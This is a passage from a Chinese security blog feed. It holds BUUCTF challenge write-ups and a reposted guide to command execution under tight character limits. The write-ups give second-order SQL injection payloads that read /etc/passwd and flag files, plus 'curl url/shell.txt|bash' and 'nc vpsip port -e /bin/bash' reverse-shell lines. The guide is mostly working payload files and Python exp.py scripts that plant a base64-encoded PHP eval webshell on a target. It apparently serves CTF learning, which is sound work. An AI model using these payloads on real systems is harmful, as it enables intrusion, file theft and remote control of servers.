由于我们这里是GET，所以要进行两次url编码</span></span><br></pre></td></tr></table></figure><p>在访问，即可得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://10.55.109.11:80/shell.php</span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h1><p>506F2E706870 hextotext得到Po.php<br>结果是And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php，进去就能得到flag</p><h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p>已经提示用户名和密码了，弱密码登录（得自己去爆破）<br>zhangwei666即可<br>.git泄露，Git_Extract恢复一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现当do=write的时候，传入的信息都会进行转义，但是数据库会自动清除反斜杠，<br>当do=comment的时候，可以发现直接从category这个字段进行查询，这就导致了二次注入<br>所以说那个转义函数根本起不到防护的作用。<br>要在第一步的时候插入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category=1’,content=user(),/*</span><br></pre></td></tr></table></figure><p>在第二步的时候留言</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=*/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这样插入数据库中的留言就会变成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into comment</span><br><span class="line">            <span class="built_in">set</span> category = <span class="string">'1'</span>,content=user(),/*</span><br><span class="line">                content = <span class="string">'*/#'</span>,</span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span></span><br></pre></td></tr></table></figure><p>这里注意一下 <code>#</code> 注释一行 <code>/**/</code>注释多行   </p><p>看到是 root 用户，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 SQL语句 读取flag文件了。</p><p>首先读取 /etc/passwd 看看服务器上有哪些用户，payload为: 1’,content=(select load_file(‘/etc/passwd’)),/*<br>发现 www 用户的一些操作。看见有 .DS_Store 文件，考虑到目标环境是docker，所以 .DS_Store 文件应该在 /tmp 中。而 .DS_Store 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： ‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*<br>得知flag文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">',content=(select hex(load_file('</span>/var/www/html/flag_8946e1ff1ee3e40f.php<span class="string">'))),/*</span></span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h1><p>vim编辑一个文件产生的临时文件，处理不当有可能造成泄露。其泄露方式为<br>文件名.swp 有些时候文件名前会有一个点.。然后获得这个.swp文件后，在Linux里通过命令 vim -r xxx.swp 来让临时文件恢复正常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;    </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;   exec($girl);        <span class="comment">//duangShell~~~~    </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题的RCE绕过<br>poc1：通过 curl url获得某个网址的某个文件的内容，再通过管道符转移给bash处理,如:<br>curl url/shell.txt|bash shell.txt里是要执行的命令，本题建议在shell.txt里放反弹shell指令<br>poc2:<br>监听命令<br>攻击机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure><p>靶机上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc vpsip port -e /bin/bash</span><br></pre></td></tr></table></figure><p>用find / -name flag 寻找flag </p><h1 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h1><p>应该是输入文件，对其进行check后删除，正好符合前面提示要求的删除的test.php<br>输入</p><p><a href="http://5612956a-2228-4ed1-99ae-3039a69fa7d1.node3.buuoj.cn/test.php" target="_blank" rel="noopener">http://5612956a-2228-4ed1-99ae-3039a69fa7d1.node3.buuoj.cn/test.php</a></p><p>点击input，发现页面发生了变化<br>点击check并抓包<br>看到有base64编码，解码后发现是时间戳，将其修改为0，然后Forward<br>b站视频的av号，去翻一下评论即可得到flag</p><h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p>查看源码发现最底下有个提示，说明可能存在文件包含    </p><p>用filter伪协议读出所有可以找到的页面和文件的源码，整理一下， 开始分析可能存在的漏洞  </p><p>confirm.php存储 address 字段的值，change.php 又拿出来使用，导致 二次注入  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span>/flag.txt<span class="string">'),1,20)),0x7e),1)#</span></span><br><span class="line"><span class="string">1'</span> <span class="built_in">where</span> user_id=updatexml(1,concat(0x7e,(select substr(load_file(<span class="string">'/flag.txt'</span>),21,40)),0x7e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BUUCTF是一个ctf平台,里面都是一些经典赛题。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>有限字符下的命令执行</title>
    <link href="https://blog.cfyqy.com/article/141bd5ee.html"/>
    <id>https://blog.cfyqy.com/article/141bd5ee.html</id>
    <published>2020-12-28T15:37:15.000Z</published>
    <updated>2021-01-05T03:10:44.315Z</updated>
    
    <content type="html"><![CDATA[<p>命令执行的字符限制绕过  </p><a id="more"></a><p>转载 <a href="http://purplet.top/2020/12/28/%E6%9C%89%E9%99%90%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">CTF相关知识点<br>有限字符下的任意命令执行总结</a></p><h1 id="15位可控字符"><a href="#15位可控字符" class="headerlink" title="15位可控字符"></a>15位可控字符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'too long'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为只能传入14个字符，但是没有限制命令执行的次数，所以我们的思想可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段一句话木马到指定文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(</span><br><span class="line">$_GET</span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>经测试上述这样的一句话木马（经过换行）是可以命令执行的，所以我们可以通过传参构造出这样的一句话木马，不断传入以下Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> \<span class="meta">&lt;?php</span>&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>\(&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \$_GET&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \[<span class="number">1</span>\]&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \)\;&gt;&gt;<span class="number">1</span></span><br><span class="line">mv <span class="number">1</span> <span class="number">1.</span>php</span><br></pre></td></tr></table></figure><h1 id="7位可控字符"><a href="#7位可控字符" class="headerlink" title="7位可控字符"></a>7位可控字符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>]&lt;=<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;a       <span class="comment">#虽然没有输入但是会创建a这个文件</span></span><br><span class="line">ls -t     <span class="comment">#ls基于基于事件排序（从晚到早）</span></span><br><span class="line">sh a     <span class="comment">#sh会把a里面的每行内容当作命令来执行</span></span><br><span class="line">使用\进行命令拼接  <span class="comment">#l\ s = ls</span></span><br><span class="line">base64 <span class="comment">#使用base64编码避免特殊字符</span></span><br></pre></td></tr></table></figure><p>目标，写入语句<code>“&lt;?php eval($_GET[1]);”</code>，base64编码后“PD9waHAgZXZhbCgkX0dFVFsxXSk7”</p><p>需要被执行的语句是：“echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php”<br>payload.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">target_url=<span class="string">"http://192.168.1.101"</span></span><br><span class="line">url = target_url+<span class="string">"/command.php?1=&#123;&#125;"</span></span><br><span class="line">print(<span class="string">"[+]start attack!!!"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"payload.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="string">"[*]"</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(target_url+<span class="string">"/1.php"</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">"[*]Attack success!!!"</span>)</span><br></pre></td></tr></table></figure><p>攻击完后生成1.php</p><h1 id="5位可控字符"><a href="#5位可控字符" class="headerlink" title="5位可控字符"></a>5位可控字符</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"orange"</span> . <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="built_in">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]) &lt;= 5) &#123;</span><br><span class="line">        @<span class="built_in">exec</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @<span class="built_in">exec</span>(<span class="string">'/bin/rm -rf '</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</li><li>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</li><li>用dir来代替ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line"><span class="built_in">echo</span> 1234 &gt; v</span><br><span class="line">*v （等同于命令：rev v</span><br></pre></td></tr></table></figure><p>两种利用方式：</p><ul><li>反弹shell: 一种是curl服务起上写好的文件，进行反弹Shell，</li><li>写马：写入一句话木马</li></ul><p>详细的解释参看<a href="https://www.freesion.com/article/8743881775/" target="_blank" rel="noopener">https://www.freesion.com/article/8743881775/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="variable">$&#123;IFS&#125;</span>PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d&gt;1.php</span><br></pre></td></tr></table></figure><p>那么我们只需要将上面的代码拆分倒序输入到主机即可。我们需要让sh先执行a文件（ls -th &gt;f）就会得到f文件，最后再让sh去执行f文件即可得到1.php。最终payload如下<br>payload.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\ </span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\ </span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">target_url=<span class="string">"http://192.168.1.101"</span></span><br><span class="line">url = target_url+<span class="string">"/command.php?cmd=&#123;&#125;"</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+]start attack!!!"</span>)</span><br><span class="line">with open(<span class="string">"payload.txt"</span>,<span class="string">"r"</span>,encoding=<span class="string">"utf-8"</span>) as f:</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[*]"</span> + url.format(i.strip()))</span><br><span class="line">requests.get(url.format(i.strip()))</span><br><span class="line"><span class="built_in">test</span> = requests.get(target_url+<span class="string">"/sandbox/fec93fd8e80b1dce1c81d832dc43fa40/1.php"</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[*]Attack success!!!"</span>)</span><br></pre></td></tr></table></figure><p>在本地实验中用sh失败了，用bash成功，不知道啥原因<br><img src="../../images/loopholes/command/1.png" alt=""></p><h1 id="四位可控字符"><a href="#四位可控字符" class="headerlink" title="四位可控字符"></a>四位可控字符</h1><p>与之前的5位是一样的，经测试构造的payload.txt内容去掉了一个\也可以成功输出1.php<br>payload.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\</span><br><span class="line">&gt;1.\</span><br><span class="line">&gt;\&gt;\</span><br><span class="line">&gt;-d\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;64\</span><br><span class="line">&gt;se\</span><br><span class="line">&gt;ba\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;7\</span><br><span class="line">&gt;Sk\</span><br><span class="line">&gt;X\</span><br><span class="line">&gt;x\</span><br><span class="line">&gt;Fs\</span><br><span class="line">&gt;FV\</span><br><span class="line">&gt;d\</span><br><span class="line">&gt;X0\</span><br><span class="line">&gt;k\</span><br><span class="line">&gt;g\</span><br><span class="line">&gt;bC\</span><br><span class="line">&gt;h\</span><br><span class="line">&gt;XZ\</span><br><span class="line">&gt;gZ\</span><br><span class="line">&gt;A\</span><br><span class="line">&gt;aH\</span><br><span class="line">&gt;w\</span><br><span class="line">&gt;D9\</span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\</span><br><span class="line">&gt;IF\</span><br><span class="line">&gt;&#123;\</span><br><span class="line">&gt;\$\</span><br><span class="line">&gt;o\</span><br><span class="line">&gt;ch\</span><br><span class="line">&gt;e\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><h1 id="三位可控字符"><a href="#三位可控字符" class="headerlink" title="三位可控字符"></a>三位可控字符</h1><p>来自CTFSHOW平台的【nl】难了 一题 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 